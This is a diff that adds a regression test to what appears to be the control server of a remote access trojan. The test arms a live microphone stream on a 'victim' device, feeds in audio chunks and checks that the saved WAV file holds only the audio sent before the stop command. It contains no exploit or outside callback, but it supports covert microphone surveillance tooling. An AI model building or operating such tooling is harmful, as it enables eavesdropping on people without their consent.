@@ -121,6 +121,28 @@ async function main() {
   const devs = await get("/api/devices");
   assert.ok(text(devs).includes("unittest1"), "devices API lists victim");
 
+  // 9. mic stream: order arms the stream, audioDataStop finalizes the WAV, and
+  //    a trailing in-flight audioData chunk must NOT recreate a phantom empty
+  //    WAV (regression for the 2.1.4 fix).
+  const micDir = path.join(TMP, "dl", "unittest1");
+  const wavsBefore = fs.readdirSync(micDir).filter((f) => f.endsWith(".wav")).length;
+  await post("/api/order", JSON.stringify({ order: "mic-live" }));
+  const pollArm = await get(B + "&sid=" + eioSid);
+  assert.strictEqual(text(pollArm), '42["order",{"order":"x0000listenMic"}]', "mic-live order wire format");
+  await post(B + "&sid=" + eioSid, '42["audioData","QUJDRA=="]');   // "ABCD"
+  await post(B + "&sid=" + eioSid, '42["audioData","RUZHSA=="]');   // "EFGH"
+  await post(B + "&sid=" + eioSid, '42["audioDataStop","stop"]');   // finalize
+  await post(B + "&sid=" + eioSid, '42["audioData","SUVKTA=="]');   // trailing straggler
+  const wavs = fs.readdirSync(micDir).filter((f) => f.endsWith(".wav"));
+  assert.strictEqual(wavs.length, wavsBefore + 1, "exactly one WAV created despite trailing chunk");
+  const wavData = fs.readFileSync(path.join(micDir, wavs[wavs.length - 1]));
+  assert.ok(wavData.length > 44, "WAV has header + audio bytes");
+  assert.deepStrictEqual(
+    [...wavData.subarray(44)],
+    [...Buffer.concat([Buffer.from("ABCD"), Buffer.from("EFGH")])],
+    "WAV body holds only the pre-stop chunks"
+  );
+
   console.log("ALL TESTS PASSED  (" + events.length + " events, " +
     fs.readdirSync(path.join(TMP, "dl", "unittest1")).length + " files saved)");
   served.stop();
